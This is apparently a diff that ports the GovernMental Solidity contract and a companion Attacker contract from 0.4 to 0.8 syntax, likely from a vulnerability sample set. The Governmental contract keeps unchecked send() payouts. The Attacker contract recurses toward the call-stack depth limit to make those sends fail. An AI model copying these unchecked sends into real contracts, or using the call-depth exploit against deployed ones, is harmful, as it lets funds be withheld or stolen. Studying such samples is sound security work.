@@ -5,7 +5,7 @@
  */
 
 //added pragma version
-pragma solidity ^0.4.0;
+pragma solidity ^0.8.0;
 
 contract Governmental {
   address public owner;
@@ -14,27 +14,27 @@ contract Governmental {
   uint public lastInvestmentTimestamp;
   uint public ONE_MINUTE = 1 minutes;
 
-  function Governmental() {
+  constructor() payable {
     owner = msg.sender;
-    if (msg.value<1 ether) throw;
+    if (msg.value<1 ether) revert();
   }
 
-  function invest() {
-    if (msg.value<jackpot/2) throw;
+  function invest() public payable {
+    if (msg.value<jackpot/2) revert();
     lastInvestor = msg.sender;
     jackpot += msg.value/2;
     
     lastInvestmentTimestamp = block.timestamp;
   }
 
-  function resetInvestment() {
+  function resetInvestment() public {
     if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
-      throw;
+      revert();
 
-    lastInvestor.send(jackpot);
-    owner.send(this.balance-1 ether);
+    payable(lastInvestor).send(jackpot);
+    payable(owner).send(address(this).balance-1 ether);
 
-    lastInvestor = 0;
+    lastInvestor = address(0);
     jackpot = 1 ether;
     lastInvestmentTimestamp = 0;
   }
@@ -42,9 +42,9 @@ contract Governmental {
 
 contract Attacker {
 
-  function attack(address target, uint count) {
+  function attack(address target, uint count) public {
     if (0<=count && count<1023) {
-      this.attack.gas(msg.gas-2000)(target, count+1);
+      this.attack{gas: gasleft()-2000}(target, count+1);
     }
     else {
       Governmental(target).resetInvestment();
